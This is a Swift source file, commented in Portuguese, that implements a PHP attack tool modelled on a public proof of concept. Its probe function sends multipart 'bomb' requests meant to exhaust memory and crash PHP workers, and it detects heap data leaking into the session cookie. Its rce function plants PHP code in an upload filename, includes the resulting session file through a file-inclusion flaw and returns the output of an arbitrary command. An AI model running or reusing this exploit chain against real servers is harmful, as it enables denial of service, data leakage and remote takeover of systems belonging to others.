import Foundation
import Darwin
import PastoralCore

// MARK: - PHP2Shell probe — I/O de sockets (HTTP/1.1 bruto)
//
// Replica as etapas de verificação do ikow/php2shell-poc (MIT) sobre TCP
// direto, sem passar pelo proxy transparente:
//   1. GET de referência  → o alvo responde + headers de versão
//   2. POST header-bomb   → OOM no parser multipart → 5xx ou worker cai
//   3. POST nested-bomb   → segunda estratégia de OOM (se a 1ª não disparou)
//   4. POST upload-base   → Set-Cookie com PHPSESSID anômalo = heap vazada
//   (opcional) cadeia A: planta código no filename do upload e dispara o
//   sink LFI contra sess_<sid> → RCE com output entre marcadores.
//
// Toda chamada é *blocking* (BSD sockets) — invocar a partir de
// Task.detached, no mesmo padrão de OnvifClient/RTSPSnapshotClient.

enum PhpProbe {

    /// Resultado da execução da cadeia A de RCE.
    struct RCEResult: Sendable {
        /// O alvo respondeu (TCP) em pelo menos uma tentativa.
        let reached: Bool
        let confirmed: Bool
        /// Output do comando entre os marcadores, quando confirmado.
        let output: String?
        let attemptsUsed: Int
    }

    private static func boundary() -> String {
        "PASTORAL" + UUID().uuidString.replacingOccurrences(of: "-", with: "").lowercased().prefix(12)
    }

    private static func sid() -> String {
        "pastoral" + UUID().uuidString.replacingOccurrences(of: "-", with: "").lowercased().prefix(20)
    }

    // MARK: - Probe (blocking)

    /// Rodo as etapas 1–4 contra o alvo e devolve o relatório consolidado.
    static func probe(host: String, port: Int, path: String,
                      intensity: PhpOOMIntensity = .medium) -> PhpProbeReport {
        let basePath = path.isEmpty ? "/" : path
        let mp = "multipart/form-data; boundary=\(boundary())"

        // 1. Baseline: o alvo responde? anuncia versão?
        let raw1 = http("GET", host: host, port: port, path: basePath, readTimeout: 8)
        let baseline = Php2ShellProbeLogic.classify(rawResponse: raw1)
        if case .unreachable = baseline {
            return PhpProbeReport(host: host, port: port, path: basePath,
                                  baseline: .unreachable, oomHeaders: .unreachable,
                                  oomNested: .unreachable, fingerprint: nil,
                                  disclosureBytes: nil)
        }
        let fingerprint: PhpFingerprint? = raw1.flatMap { raw in
            HTTPResponseParser.parse(raw).flatMap { PhpFingerprint(headers: $0.headers) }
        }

        // 2. Header-bomb (estratégia 2 do PoC).
        let hb = intensity.headerBomb
        let bombB = boundary()
        let bombBody = Php2ShellMultipart.oomHeaderBomb(boundary: bombB,
                                                        headerCount: hb.count,
                                                        headerSize: hb.size)
        let raw2 = http("POST", host: host, port: port, path: basePath,
                        contentType: "multipart/form-data; boundary=\(bombB)",
                        body: bombBody, readTimeout: 25)
        let oomHeaders = Php2ShellProbeLogic.classify(rawResponse: raw2)

        // 3. Nested-bomb (estratégia 3) só se a 1ª não confirmou.
        var oomNested: ProbeSignal = .normal(0)
        if !oomHeaders.positive {
            let nb = intensity.nestedBomb
            let nbB = boundary()
            let nbBody = Php2ShellMultipart.oomNestedBomb(boundary: nbB,
                                                          depth: nb.depth, width: nb.width)
            let raw3 = http("POST", host: host, port: port, path: basePath,
                            contentType: "multipart/form-data; boundary=\(nbB)",
                            body: nbBody, readTimeout: 25)
            oomNested = Php2ShellProbeLogic.classify(rawResponse: raw3)
        } else {
            oomNested = .normal(0)   // não enviado (já confirmado)
        }

        // 4. Upload-base com SID fixado: eco normal = upload_progress ativo;
        //    PHPSESSID anômalo = heap do worker vazou no cookie.
        let s = sid()
        let small = Php2ShellMultipart.upload(boundary: mpBoundary(mp), sid: s, filename: "x")
        let raw4 = http("POST", host: host, port: port, path: basePath,
                        contentType: mp, body: small, cookie: "PHPSESSID=\(s)",
                        readTimeout: 10)
        let leaked = Php2ShellProbeLogic.sessionIdValue(in: raw4)
        let bytes = (leaked?.count ?? 0) > 64 ? leaked!.count : nil
        let sample = leaked.flatMap { v in v.count > 64 ? String(v.prefix(4096)) : nil }

        return PhpProbeReport(host: host, port: port, path: basePath,
                              baseline: baseline, oomHeaders: oomHeaders,
                              oomNested: oomHeaders.positive ? .unreachable : oomNested,
                              fingerprint: fingerprint,
                              disclosureBytes: bytes, disclosureSample: sample,
                              sessionCookieEchoed: Php2ShellProbeLogic.echoedSession(id: raw4, sid: s))
    }

    // MARK: - Cadeia A de RCE (blocking)

    static func rce(host: String, port: Int, path: String,
                    lfiBase: String, sessionDir: String, command: String,
                    attempts: Int = 3, readTimeout: Double = 10) -> RCEResult {
        let basePath = path.isEmpty ? "/" : path
        var reachedAny = false
        for attempt in 1...max(1, attempts) {
            let s = sid()
            // Planta: filename com código PHP → arquivo de sessão sess_<sid>.
            let b = boundary()
            let code = Php2ShellRCE.plantCode(command: command)
            let body = Php2ShellMultipart.upload(boundary: b, sid: s, filename: code)
            _ = http("POST", host: host, port: port, path: basePath,
                     contentType: "multipart/form-data; boundary=\(b)",
                     body: body, cookie: "PHPSESSID=\(s)", readTimeout: readTimeout)
            Thread.sleep(forTimeInterval: 0.05)
            // Dispara: LFI faz include() do arquivo de sessão.
            let file = sessionDir.hasSuffix("/")
                ? "\(sessionDir)sess_\(s)"
                : "\(sessionDir)/sess_\(s)"
            guard let raw = http("GET", host: host, port: port,
                                 path: Php2ShellRCE.lfiPath(base: lfiBase, sessionFile: file),
                                 cookie: "PHPSESSID=\(s)", readTimeout: readTimeout) else {
                continue   // sem TCP nesta tentativa
            }
            reachedAny = true
            if let out = Php2ShellRCE.output(
                in: String(data: raw, encoding: .utf8) ?? "") {
                return RCEResult(reached: true, confirmed: true,
                                 output: out, attemptsUsed: attempt)
            }
        }
        return RCEResult(reached: reachedAny, confirmed: false,
                         output: nil, attemptsUsed: max(1, attempts))
    }

    /// Extrai a boundary de uma Content-Type multipart já montado.
    private static func mpBoundary(_ contentType: String) -> String {
        guard let p = contentType.range(of: "boundary=") else { return "PASTORAL" }
        return String(contentType[p.upperBound...])
    }

    // MARK: - HTTP/1.1 bruto

    /// Envia uma request única (Connection: close) e devolve a resposta
    /// crua. `nil` = não houve conexão TCP; `Data()` = caiu no meio.
    private static func http(_ method: String, host: String, port: Int, path: String,
                             contentType: String? = nil, body: Data? = nil,
                             cookie: String? = nil,
                             connectTimeout: Double = 4, readTimeout: Double) -> Data? {
        guard let s = try? connectTCP(host: host, port: port, timeout: connectTimeout)
        else { return nil }
        defer { close(s) }

        var head = "\(method) \(path) HTTP/1.1\r\nHost: \(host)\r\n"
        if let ct = contentType { head += "Content-Type: \(ct)\r\n" }
        if let b = body { head += "Content-Length: \(b.count)\r\n" }
        if let c = cookie { head += "Cookie: \(c)\r\n" }
        head += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Pastoral/1.1\r\n"
        head += "Connection: close\r\n\r\n"
        var payload = Data(head.utf8)
        if let b = body { payload.append(b) }
        guard sendAll(s, payload) else { return Data() }   // morreu no meio do send
        return readAll(s, timeout: readTimeout)
    }

    private static func sendAll(_ s: Int32, _ data: Data) -> Bool {
        data.withUnsafeBytes { (raw: UnsafeRawBufferPointer) -> Bool in
            var sent = 0
            while sent < raw.count {
                let n: Int = raw.baseAddress!.advanced(by: sent).withMemoryRebound(
                    to: UInt8.self, capacity: raw.count - sent) {
                    Darwin.send(s, $0, raw.count - sent, 0)
                }
                if n <= 0 {
                    if errno == EINTR { continue }
                    return false
                }
                sent += n
            }
            return true
        }
    }

    /// Lê até EOF/timeout/cap. Encerra cedo se o corpo completo chegou.
    private static func readAll(_ s: Int32, timeout: Double, cap: Int = 4_000_000) -> Data {
        var out = Data()
        var buf = [UInt8](repeating: 0, count: 65_536)
        let deadline = Date().addingTimeInterval(timeout)
        while out.count < cap {
            let remain = deadline.timeIntervalSinceNow
            guard remain > 0 else { break }
            var pfd = pollfd(fd: s, events: Int16(POLLIN), revents: 0)
            guard poll(&pfd, 1, Int32(remain * 1000)) > 0 else { break }
            let n = recv(s, &buf, buf.count, 0)
            guard n > 0 else { break }
            out.append(contentsOf: buf.prefix(n))
            // Corpo completo? Não fica segurando o socket até o timeout.
            if let p = HTTPResponseParser.parse(out),
               let cl = p.headers.first(where: { $0.key.lowercased() == "content-length" })
                    .flatMap({ Int($0.value) }),
               out.count >= p.rawHead.count + cl { break }
        }
        return out
    }

    /// TCP non-blocking + poll — mesmo padrão de OnvifClient.connectTCP.
    private static func connectTCP(host: String, port: Int, timeout: Double) throws -> Int32 {
        var hints = addrinfo()
        hints.ai_family = AF_INET
        hints.ai_socktype = SOCK_STREAM
        var result: UnsafeMutablePointer<addrinfo>?
        guard getaddrinfo(host, String(port), &hints, &result) == 0,
              let info = result else {
            throw NSError(domain: "PhpProbe", code: -1)
        }
        defer { freeaddrinfo(info) }
        let s = socket(info.pointee.ai_family, info.pointee.ai_socktype,
                       info.pointee.ai_protocol)
        guard s >= 0 else { throw NSError(domain: "PhpProbe", code: -2) }
        let flags = fcntl(s, F_GETFL, 0)
        _ = fcntl(s, F_SETFL, flags | O_NONBLOCK)
        let rc = Darwin.connect(s, info.pointee.ai_addr, info.pointee.ai_addrlen)
        if rc != 0 && errno != EINPROGRESS {
            close(s)
            throw NSError(domain: "PhpProbe", code: -3)
        }
        var pfd = pollfd(fd: s, events: Int16(POLLOUT), revents: 0)
        guard poll(&pfd, 1, Int32(timeout * 1000)) > 0,
              (pfd.revents & Int16(POLLOUT)) != 0 else {
            close(s)
            throw NSError(domain: "PhpProbe", code: -4)
        }
        var err: Int32 = 0
        var len = socklen_t(MemoryLayout<Int32>.size)
        guard getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &len) == 0, err == 0 else {
            close(s)
            throw NSError(domain: "PhpProbe", code: -5)
        }
        _ = fcntl(s, F_SETFL, flags)
        return s
    }
}
